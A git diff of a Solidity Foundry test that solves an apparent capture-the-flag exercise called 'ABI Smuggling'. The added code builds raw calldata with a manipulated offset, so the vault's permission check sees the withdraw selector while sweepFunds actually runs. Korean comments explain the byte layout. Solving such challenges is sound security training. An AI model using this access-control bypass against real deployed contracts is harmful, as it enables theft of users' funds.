@@ -36,8 +36,8 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
-        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
-        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault)); // sweepFunds
+        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));    // withdraw
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -73,7 +73,29 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
+        bytes memory sweepFundsCalldata = abi.encodeCall(vault.sweepFunds, (recovery, IERC20(address(token))));
         
+        /*
+        [0:4]       execute selector -> 0x1cff79cd
+        [4:36]      target  -> vault
+        [36:68]     offset = 0x64  (100)
+        [68:100]    패딩 (32바이트)
+        [100:104]   withdraw selector  ← 권한 체크
+        [104:136]   actionData length -> 4 + 32 + 32 = 68
+        [136:]      sweepFunds calldata  ← 실제 실행 
+        */
+        bytes memory attackCalldata = abi.encodePacked(
+            vault.execute.selector, // execute selector
+            bytes32(uint256(uint160(address(vault)))),
+            bytes32(uint256(0x64)), // offset = 0x64  (100)
+            bytes32(0), // padding (32바이트)
+            vault.withdraw.selector, // withdraw selector
+            bytes32(sweepFundsCalldata.length), // actionData length
+            sweepFundsCalldata
+        );
+
+        (bool success, ) = address(vault).call(attackCalldata);
+        assertTrue(success);
     }
 
     /**
